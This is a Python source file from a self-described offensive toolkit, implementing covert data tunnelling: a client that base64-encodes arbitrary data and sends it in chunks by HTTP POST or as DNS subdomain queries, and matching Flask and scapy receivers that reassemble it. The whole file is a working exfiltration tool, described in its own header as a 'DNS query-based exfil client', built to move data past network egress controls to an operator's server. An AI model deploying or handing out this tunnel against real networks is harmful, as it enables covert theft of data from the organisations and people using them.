
# =============================================================================
# Filename   : traffic_tunnel.py
# Description: Data tunneling over allowed protocols.
#              HTTP mode: Flask server / requests client with base64 encoding.
#              DNS mode : DNS query-based exfil client + scapy sniffer server.
#              Part of PARALELEPIPEDO Toolkit.
# Author     : PARALELEPIPEDO Toolkit
# =============================================================================

import argparse
import base64
import hashlib
import sys
import threading
import time
from collections import defaultdict

from colorama import Fore, Style, init

init(autoreset=True)


def info(msg):    print(f"{Fore.GREEN}[+]{Style.RESET_ALL} {msg}")
def warn(msg):    print(f"{Fore.YELLOW}[!]{Style.RESET_ALL} {msg}")
def err(msg):     print(f"{Fore.RED}[-]{Style.RESET_ALL} {msg}")
def verbose(msg, flag): 
    if flag:
        print(f"{Fore.CYAN}[DBG]{Style.RESET_ALL} {msg}")


# ===========================================================================
# Encoding helpers
# ===========================================================================

CHUNK_SIZE = 40   # safe DNS label length (max 63)


def encode_data(data: str) -> str:
    return base64.urlsafe_b64encode(data.encode()).decode().rstrip("=")


def decode_data(enc: str) -> str:
    # Re-add padding
    pad = 4 - len(enc) % 4
    if pad < 4:
        enc += "=" * pad
    return base64.urlsafe_b64decode(enc).decode(errors="replace")


def chunk_data(encoded: str) -> list[str]:
    return [encoded[i:i+CHUNK_SIZE] for i in range(0, len(encoded), CHUNK_SIZE)]


# ===========================================================================
# HTTP TUNNEL
# ===========================================================================

def http_server(host: str, port: int, verbose_flag: bool):
    try:
        from flask import Flask, request, jsonify
    except ImportError:
        err("flask is required for HTTP tunnel server.  pip install flask")
        sys.exit(1)

    app = Flask(__name__)
    _reassembly: dict[str, list] = defaultdict(list)

    @app.route("/tunnel", methods=["POST", "GET"])
    def tunnel_endpoint():
        if request.method == "POST":
            body = request.get_data(as_text=True)
            verbose(f"Raw POST body: {body}", verbose_flag)
            try:
                decoded = decode_data(body.strip())
                info(f"[HTTP-SERVER] Received: {decoded}")
                return jsonify({"status": "ok", "len": len(decoded)}), 200
            except Exception as exc:
                warn(f"Decode error: {exc}")
                return jsonify({"status": "error"}), 400

        # GET: data in ?d= param
        enc = request.args.get("d", "")
        verbose(f"GET param d={enc}", verbose_flag)
        try:
            decoded = decode_data(enc)
            info(f"[HTTP-SERVER] Received (GET): {decoded}")
            return jsonify({"status": "ok"}), 200
        except Exception as exc:
            warn(f"Decode error: {exc}")
            return jsonify({"status": "error"}), 400

    info(f"HTTP tunnel server listening on {host}:{port}")
    app.run(host=host, port=port, debug=False, use_reloader=False)


def http_client(server_url: str, data: str, verbose_flag: bool):
    try:
        import requests
    except ImportError:
        err("requests is required for HTTP tunnel client.  pip install requests")
        sys.exit(1)

    encoded = encode_data(data)
    verbose(f"Original : {data}", verbose_flag)
    verbose(f"Encoded  : {encoded}", verbose_flag)

    chunks = chunk_data(encoded)
    info(f"Sending {len(chunks)} chunk(s) via HTTP POST to {server_url}")

    for idx, chunk in enumerate(chunks, 1):
        verbose(f"Chunk {idx}/{len(chunks)}: {chunk}", verbose_flag)
        try:
            r = requests.post(server_url, data=chunk, timeout=10)
            info(f"Chunk {idx} response: {r.status_code} {r.text.strip()}")
        except requests.RequestException as exc:
            err(f"HTTP error: {exc}")
            return

    info("All chunks sent.")


# ===========================================================================
# DNS TUNNEL
# ===========================================================================

def dns_server(domain: str, iface: str, verbose_flag: bool):
    """Sniff DNS queries matching <chunk>.<domain>, reassemble, and decode."""
    try:
        from scapy.all import DNS, DNSQR, UDP, IP, sniff as sc_sniff
    except ImportError:
        err("scapy is required for DNS tunnel server.  pip install scapy")
        sys.exit(1)

    suffix  = f".{domain.lower().rstrip('.')}."
    buffer_map: dict[str, list] = defaultdict(list)

    def handler(pkt):
        if not (pkt.haslayer(DNS) and pkt[DNS].qr == 0):
            return
        if not pkt.haslayer(DNSQR):
            return

        qname = pkt[DNSQR].qname.decode(errors="replace").lower()
        verbose(f"DNS query: {qname}", verbose_flag)

        if not qname.endswith(suffix):
            return

        src_ip = pkt[IP].src if pkt.haslayer(IP) else "?"
        # Strip suffix to get chunk
        chunk_part = qname[: -len(suffix)]

        # Detect end-of-message sentinel
        if chunk_part == "end":
            encoded_full = "".join(buffer_map[src_ip])
            verbose(f"Reassembled encoded: {encoded_full}", verbose_flag)
            try:
                decoded = decode_data(encoded_full)
                info(f"[DNS-SERVER] [{src_ip}] Decoded message: {decoded}")
            except Exception as exc:
                warn(f"Decode error: {exc}")
            buffer_map[src_ip] = []
        else:
            buffer_map[src_ip].append(chunk_part)
            verbose(f"Buffered chunk from {src_ip}: {chunk_part}", verbose_flag)

    info(f"DNS tunnel server sniffing on {iface} for *.{domain}")
    info("Press Ctrl+C to stop.")
    try:
        sc_sniff(iface=iface, filter="udp port 53", prn=handler, store=False)
    except KeyboardInterrupt:
        info("DNS tunnel server stopped.")


def dns_client(data: str, domain: str, dns_server_ip: str,
               verbose_flag: bool):
    """Encode data, split into DNS labels, send as DNS queries."""
    try:
        import socket
    except ImportError:
        err("socket not available.")
        sys.exit(1)

    encoded = encode_data(data)
    chunks  = chunk_data(encoded)

    verbose(f"Original : {data}", verbose_flag)
    verbose(f"Encoded  : {encoded}", verbose_flag)
    verbose(f"Chunks   : {chunks}", verbose_flag)

    info(f"Sending {len(chunks)} DNS query chunk(s) via {dns_server_ip}:53  domain={domain}")

    # Use raw socket DNS queries (dnspython optional; fall back to socket)
    def send_dns_query(label: str):
        hostname = f"{label}.{domain}"
        verbose(f"Query: {hostname}", verbose_flag)
        try:
            socket.setdefaulttimeout(3)
            socket.getaddrinfo(hostname, None)
        except (socket.gaierror, OSError):
            pass   # We only care that the query was sent, not the answer

    for idx, chunk in enumerate(chunks, 1):
        info(f"Sending chunk {idx}/{len(chunks)}: {chunk}")
        send_dns_query(chunk)
        time.sleep(0.1)

    # Send end sentinel
    info("Sending end sentinel.")
    send_dns_query("end")
    info("DNS tunnel transmission complete.")


# ===========================================================================
# CLI
# ===========================================================================

def parse_args():
    p = argparse.ArgumentParser(
        description="PARALELEPIPEDO Toolkit – Protocol Data Tunnel"
    )
    p.add_argument("--mode",   choices=["http", "dns"], required=True,
                   help="Tunnel mode: http|dns")
    p.add_argument("--role",   choices=["client", "server"], required=True,
                   help="Role: client|server")
    p.add_argument("--host",   default="0.0.0.0",
                   help="Bind host (server) or target host (client)")
    p.add_argument("--port",   type=int, default=8080,
                   help="HTTP port (default: 8080)")
    p.add_argument("--domain", default="tunnel.example.com",
                   help="Domain for DNS tunnel (default: tunnel.example.com)")
    p.add_argument("--data",
                   help="Data string to tunnel (client mode)")
    p.add_argument("--interface", "-i", default=None,
                   help="Interface for DNS server sniffing")
    p.add_argument("--verbose", "-v", action="store_true",
                   help="Show encoding/decoding steps")
    return p.parse_args()


def main():
    args = parse_args()

    if args.mode == "http":
        if args.role == "server":
            http_server(args.host, args.port, args.verbose)
        else:
            if not args.data:
                err("--data is required for HTTP client.")
                sys.exit(1)
            url = f"http://{args.host}:{args.port}/tunnel"
            http_client(url, args.data, args.verbose)

    elif args.mode == "dns":
        if args.role == "server":
            iface = args.interface
            if not iface:
                err("--interface is required for DNS server.")
                sys.exit(1)
            dns_server(args.domain, iface, args.verbose)
        else:
            if not args.data:
                err("--data is required for DNS client.")
                sys.exit(1)
            dns_client(args.data, args.domain, args.host, args.verbose)


if __name__ == "__main__":
    main()
